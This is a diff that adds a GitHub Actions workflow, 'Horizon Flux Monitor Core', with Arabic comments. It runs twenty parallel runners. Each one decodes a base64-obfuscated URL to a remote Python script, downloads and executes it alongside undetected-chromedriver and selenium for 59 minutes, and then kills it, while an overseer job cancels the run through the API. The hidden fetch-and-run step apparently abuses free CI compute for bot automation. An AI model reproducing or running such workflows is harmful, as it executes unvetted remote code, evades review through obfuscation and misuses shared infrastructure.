@@ -1,0 +1,103 @@
+name: Horizon Flux Monitor Core
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: flux-core-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Overseer: ينتظر 59 دقيقة ثم يلغي التشغيل بالكامل
+  # =================================================================
+  horizon-overseer:
+    name: "Horizon Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DURATION: 3540
+    steps:
+      - name: Initialize Watcher
+        run: |
+          echo "[OVERSEER] System initialized for build: ${{ github.run_id }}"
+          echo "[OVERSEER] Timer set to ${WATCH_DURATION} seconds."
+
+          sleep "${WATCH_DURATION}"
+
+          echo "[OVERSEER] Timeout reached — sending abort signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[OVERSEER] Abort signal processed. Active workers will be terminated."
+
+  # =================================================================
+  # Cluster Worker: تشغيل متوازي لعقد النظام
+  # =================================================================
+  cluster-worker:
+    name: "Worker-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [A101, B102, C103, D104, E105, F106, G107, H108, I109, J110, K111, L112, M113, N114, O115, P116, Q117, R118, S119, T120]
+
+    steps:
+      # #################################################################
+      # المرحلة الأولى: تجهيز البيئة
+      # #################################################################
+      - name: Environment Setup
+        run: |
+          echo "[SETUP] Preparing node ${{ matrix.node_key }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # المرحلة الثانية: جلب السكريبت الرئيسي
+      # #################################################################
+      - name: Fetch Core Script
+        run: |
+          echo "[FETCH] Pulling primary script from source..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$TARGET_URL" -o runner_agent.py
+          echo "[FETCH] Download complete."
+
+      # #################################################################
+      # المرحلة الثالثة: تثبيت المكتبات
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # المرحلة الرابعة: تشغيل الوكيل الإداري (حد أقصى 59 دقيقة)
+      # #################################################################
+      - name: Execute Agent Process
+        run: |
+          echo ">> Starting Worker-${{ matrix.node_key }} process..."
+
+          python3 runner_agent.py &
+          AGENT_PID=$!
+
+          echo ">> Process active. Lifetime cap: 59 minutes (3540 seconds)."
+
+          sleep 3540
+
+          if kill -0 "$AGENT_PID" 2>/dev/null; then
+            echo ">> Lifetime cap reached — shutting down process."
+            kill -9 "$AGENT_PID"
+            echo ">> Process forcefully terminated."
+          else
+            echo ">> Process completed prior to expiration."
+          fi
